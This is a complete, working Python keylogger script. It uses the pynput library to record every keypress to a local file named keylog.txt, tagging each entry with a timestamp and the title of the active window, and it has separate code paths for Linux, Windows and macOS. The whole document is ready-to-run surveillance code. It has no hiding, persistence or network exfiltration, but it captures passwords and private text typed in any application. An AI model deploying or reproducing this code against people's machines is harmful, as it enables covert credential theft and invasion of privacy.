#!/usr/bin/env python3

from pynput.keyboard import Key, Listener
import logging
import sys
import subprocess


log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s: %(message)s")


def get_active_window():
    platform = sys.platform

    if platform.startswith("linux"):
        try:
            window_name = subprocess.check_output(["xdotool", "getactivewindow", "getwindowname"]).decode("utf-8").strip()
            return window_name
        except subprocess.CalledProcessError:
            return "Unknown Window"

    elif platform.startswith("win"):
        import ctypes
        user32 = ctypes.windll.user32
        hwnd = user32.GetForegroundWindow()
        length = user32.GetWindowTextLengthW(hwnd)
        buff = ctypes.create_unicode_buffer(length + 1)
        user32.GetWindowTextW(hwnd, buff, length + 1)
        return buff.value

    elif platform.startswith("darwin"):
        try:
            script = 'osascript -e \'tell application "System Events" to get name of (processes where frontmost is true)\''
            window_name = subprocess.check_output(script, shell=True).decode("utf-8").strip()
            return window_name
        except subprocess.CalledProcessError:
            return "Unknown Window"

    else:
        return "Unknown OS"


def on_press(key):
    window_title = get_active_window()
    try:
        logging.info(f"[{window_title}] Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"[{window_title}] Special key pressed: {key}")


with Listener(on_press=on_press) as listener:
    listener.join()

